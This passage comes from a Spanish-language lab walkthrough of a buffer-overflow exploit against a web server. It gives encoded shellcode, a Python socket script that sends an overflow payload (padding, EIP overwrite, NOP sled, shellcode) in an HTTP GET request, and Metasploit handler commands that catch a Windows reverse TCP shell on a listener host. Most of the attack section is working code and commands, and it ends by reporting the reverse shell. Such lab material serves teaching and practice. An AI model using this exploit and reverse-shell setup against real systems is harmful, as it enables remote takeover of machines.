shellcode += b"\x67\x32\x42\xb1\xdf\x96\x72\x16\xb9\x5d\x78"
shellcode += b"\xd3\xcd\x39\x9d\xe2\x02\x32\x99\x6f\xa5\x94"
shellcode += b"\x2b\x2b\x82\x30\x77\xef\xab\x61\xdd\x5e\xd3"
shellcode += b"\x71\xb9\x3f\x71\xfa\x28\x29\x05\x03\xb3\x56"
shellcode += b"\x5b\x93\x7f\x9b\x64\x63\xe8\xac\x17\x51\xb7"
shellcode += b"\x06\xb0\xd9\x30\x81\x47\x68\x56\x32\x97\xd2"
shellcode += b"\x37\xcc\x18\x22\x11\x0b\x4c\x72\x09\xba\xed"
shellcode += b"\x19\xc9\x43\x38\xb7\xc3\xd3\x03\xef\x9c\xa3"
shellcode += b"\xec\xed\x1c\xb5\xb0\x78\xfa\xe5\x18\x2a\x53"
shellcode += b"\x46\xc9\x8a\x03\x2e\x03\x05\x7b\x4e\x2c\xcc"
shellcode += b"\x14\xe5\xc3\xb8\x4d\x92\x7a\xe1\x06\x03\x82"
shellcode += b"\x3c\x63\x03\x08\xb4\x93\xca\xf9\xbd\x87\x3b"
shellcode += b"\x9e\x3d\x58\xbc\x0b\x3d\x32\xb8\x9d\x6a\xaa"
shellcode += b"\xc2\xf8\x5c\x75\x3c\x2f\xdf\x72\xc2\xae\xe9"
shellcode += b"\x09\xf5\x24\x55\x66\xfa\xa8\x55\x76\xac\xa2"
shellcode += b"\x55\x1e\x08\x97\x06\x3b\x57\x02\x3b\x90\xc2"
shellcode += b"\xad\x6d\x44\x44\xc6\x93\xb3\xa2\x49\x6c\x96"
shellcode += b"\xb0\x8e\x92\x64\x9f\x36\xfa\x96\x9f\xc6\xfa"
shellcode += b"\xfc\x1f\x97\x92\x0b\x0f\x18\x52\xf3\x9a\x71"
shellcode += b"\xfa\x7e\x4b\x33\x9b\x7f\x46\x95\x05\x7f\x65"
shellcode += b"\x0e\xb6\xfa\x06\xb1\x37\xfb\x0e\xd6\x38\xfb"
shellcode += b"\x2e\xe8\x05\x2d\x17\x9e\x48\xed\x2c\x91\xff"
shellcode += b"\x50\x04\x38\xff\xc7\x56\x69"



print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.72.135", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + EIP + NOPS + shellcode + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
```
Antes de ejecutar nuestro código, debemos iniciar un oyente de Metasploit

```
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 192.168.72.128
set LPORT 4444
exploit 
```

 ### Screenshot
  ![image](https://user-images.githubusercontent.com/104048850/180597952-f5c9b33a-36bf-4b88-aa1a-6d27fd368cc9.png)

Ahora ejecutamos nuestro SHELLCODE.PY 
```
python shellcode.py   
```
Finalmente tenemos nuestra SHELL REVERSE 
 ### Screenshot
 ![image](https://user-images.githubusercontent.com/104048850/180597998-de279505-d9ca-42c5-9a4f-0f31e3582cea.png)

Nota: Cuenado se ejecute el ecploit y el listener el programa vulnerable debe seguir ejecutandose, si se detubiera hay un error en el proceso, se debe corregir






